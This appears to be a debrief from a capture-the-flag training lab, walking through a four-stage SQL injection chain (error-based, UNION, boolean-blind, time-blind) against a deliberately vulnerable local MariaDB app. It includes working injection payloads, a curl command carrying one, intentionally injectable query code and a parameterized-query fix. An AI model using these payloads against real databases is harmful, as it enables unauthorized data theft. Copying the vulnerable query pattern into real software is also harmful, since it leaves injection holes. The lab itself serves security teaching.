# Trick Tower Final Exam — Debrief

**Node:** `f1` &middot; **Flag:** `SEIYAKU{all_four_styles_descend}` &middot; **Routes:** `GET /f/bookhaven/stage1..4` &middot; **Sink:** `challenges/finals.py`, real MariaDB via `core/db.mysql_conn()` &middot; **Signal:** each stage's real, extracted key unlocks the next stage's vulnerable query

## The shape of the chain

Four stages, four independent bugs, deliberately identical in root cause
and sink shape to four floors you already solved in Phase 1 — the only
thing different here is that each stage's vulnerable code path is
gated behind a genuinely safe, parameterized check:

```python
# challenges/finals.py
def _stage_key(stage: int) -> str:
    cur.execute(
        "SELECT key_value FROM bookhaven_stage_keys WHERE stage=%s",
        (stage,),
    )
    ...
```

This lookup is never the vulnerable half of anything — it exists purely
to decide *whether* a stage's own injectable query ever runs at all. A
stage 2 request with a wrong or missing `token` never even builds the
UNION query; the `q` parameter is completely inert until `token` equals
stage 1's real, extracted `key_value`. That's what makes this a genuine
chain rather than four independent bugs that happen to share a page:
there is no way to reach stage 4's injection surface without having
actually run stages 1-3's real techniques first.

## Stage 1 — error-based (identical bug to p1_2)

```python
q = f"SELECT title FROM bookhaven_catalog WHERE id='{lookup_id}'"
```

Same raw-concatenation-plus-echoed-error sink as Netero's Recipe Vault.
Payload:

```
id = 1' AND extractvalue(1,concat(0x3a,(SELECT key_value FROM bookhaven_stage_keys WHERE stage=1)))-- -
```

MariaDB's `extractvalue()` throws an XPATH syntax error whose message
embeds its own (truncated) second argument — the subquery's result —
and `f1_stage1()` renders that raw exception text back to the page,
exactly like p1_2:

```
(1105, "XPATH syntax error: ':restricted_wing_7'")
```

Stage 1's key: `restricted_wing_7`. No token was required — this stage
is the chain's entry point.

## Stage 2 — union-based (identical bug to p1_3)

```python
query = f"SELECT id,title,author FROM bookhaven_catalog WHERE title LIKE '%{q}%'"
```

Same 3-column UNION sink as the Exam Results Board. With
`token=restricted_wing_7` (stage 1's key) accepted, payload:

```
q = nonexistent' UNION SELECT stage,key_value,'x' FROM bookhaven_stage_keys WHERE stage=2-- -
```

matches `bookhaven_catalog`'s exact column shape (id: INT, title: VARCHAR,
author: VARCHAR) with type-compatible substitutes (`stage`: INT,
`key_value`: VARCHAR, `'x'`: VARCHAR), so the injected row renders as an
ordinary-looking table row: `id=2`, `title=archive_seal_42`. Stage 2's
key: `archive_seal_42`.

## Stage 3 — boolean-blind (identical bug to p1_4)

```python
q = f"SELECT 1 FROM bookhaven_catalog WHERE id='{code}'"
result = cur.fetchone() is not None   # -> PASS/FAIL, errors fold into FAIL
```

Same PASS/FAIL-only oracle as the Trick Tower Silent Room. With
`token=archive_seal_42` (stage 2's key) accepted, the same
`LENGTH()`/`ASCII(SUBSTRING(...))` bisection technique from
`solvers/p1_4.py` walks `(SELECT key_value FROM bookhaven_stage_keys
WHERE stage=3)` out one character at a time using only the PASS/FAIL
bit. Stage 3's key: `midnight_9`.

## Stage 4 — time-blind (identical bug to p1_5)

```python
q = f"SELECT title FROM bookhaven_catalog WHERE id='{lookup_id}'"
cur.fetchone()   # result discarded, response identical either way
```

Same identical-response, timing-only oracle as the Zevil Island Medical
Bay. With `token=midnight_9` (stage 3's key) accepted, the same
`IF(condition, SLEEP(N), 0)` timing-bisection technique from
`solvers/p1_5.py` walks `(SELECT key_value FROM bookhaven_stage_keys
WHERE stage=4)` out one character at a time — and that row's
`key_value` **is** this final's flag.

## The full solver, live

`solvers/f1.py` runs the entire four-stage chain against the real
running stack, extracting each stage's key with a genuinely distinct
technique and feeding it forward as the next stage's `token`. This is
the actual, unedited output of a real run against this exact seed
(`SEIYAKU_BASE` was the default `http://localhost:8000` for this run):

```
[f1] target: http://localhost:8000/f/bookhaven
[f1] stage 1 — error-based extraction of stage 1's key
  ok: stage 1 key = 'restricted_wing_7'
[f1] stage 2 — union-based extraction of stage 2's key
  ok: stage 2 key = 'archive_seal_42'
[f1] stage 3 — boolean-blind extraction of stage 3's key
  stage 3 key length: 10
  ok: stage 3 key = 'midnight_9'
[f1] stage 4 — time-blind extraction of the final flag
  final flag length: 32
  position  1: 'S'  (so far: 'S')
  ...
  position 32: '}'  (so far: 'SEIYAKU{all_four_styles_descend}')
[f1] recovered flag: 'SEIYAKU{all_four_styles_descend}'
  ok: recovered flag matches: SEIYAKU{all_four_styles_descend}
[f1] PASS
```

(Full 32-position walk trimmed here for length — `solvers/f1.py`'s real
output prints every position; see the source for the complete,
unedited transcript.)

## Confirming the gate is real, not cosmetic

A wrong token doesn't just fail a stage's own check — it prevents that
stage's vulnerable query from ever executing, `q`/`code`/`id` included:

```bash
curl -s -G "$BASE/f/bookhaven/stage2" \
    --data-urlencode "token=wrong" \
    --data-urlencode "q=nonexistent' UNION SELECT stage,key_value,'x' FROM bookhaven_stage_keys WHERE stage=2-- -"
```

renders `token missing or incorrect — this door is sealed.` with no
`rows` block at all — the UNION payload above is syntactically perfect
and would work instantly against an unlocked stage, and still does
nothing here. There is no injection-based shortcut past this check,
because the check itself is a plain, fully parameterized query with no
attacker-controlled text in it anywhere.

## The 9-step methodology, applied end-to-end

This final is the master notes' 9-step SQLi methodology (notes §5),
compressed into four gates instead of one target: (1) map entry points
— four distinct parameters across four routes; (2) fingerprint the
DBMS — MariaDB, same as every earlier floor; (3) initial tests — a bare
`'` against stage 1 confirms the sink; (4) error-based — stage 1;
(5) blind (boolean + time) — stages 3 and 4; (6) union — stage 2;
(7) advanced (OOB/2nd-order) — not required on this floor, already
covered by Phase 3; (8) automate — `sqlmap` can solve stages 1-3
individually with `-p id`/`-p q`/`-p code` once each stage's `token` is
supplied by hand, though the cross-stage chaining itself has to be
driven by a script, same as `solvers/f1.py`; (9) validate + document —
this debrief.

## HxH analogy

Trick Tower's real trial was never any single floor's specific puzzle —
it was that the tower gave you no way to reach floor four except by
actually solving floors one through three, in the order they came, each
one demanding a different kind of thinking than the last. A contestant
who only ever mastered one trick never got past the floor built to
defeat that trick specifically. Clearing this final proves something
Phase 1 alone couldn't: not just that you know four techniques, but that
you can recognize *which* one a locked door in front of you is actually
asking for, and chain the answer from one door into the key for the
next.

## Remediation

Every stage's underlying bug and fix is identical to its Phase 1
counterpart — see `phase1/README.md` and each Phase 1 floor's own
`DEBRIEF.md` for the full remediation writeups (parameterized queries,
never echoing raw DBMS errors, keeping a boolean oracle's error case
indistinguishable from its false case, and constant-time-oblivious
query design). The one lesson specific to this final: **a single
injectable parameter fixed in isolation doesn't make an application
safe if the exact same unsafe query-building pattern is copy-pasted
across every other route.** All four of this floor's routes share one
root cause (raw f-string concatenation into a SQL string) — the fix is
the same one change, applied everywhere that pattern appears, not four
separate patches:

```python
cur.execute(
    "SELECT title FROM bookhaven_catalog WHERE id=%s",
    (lookup_id,),
)
```
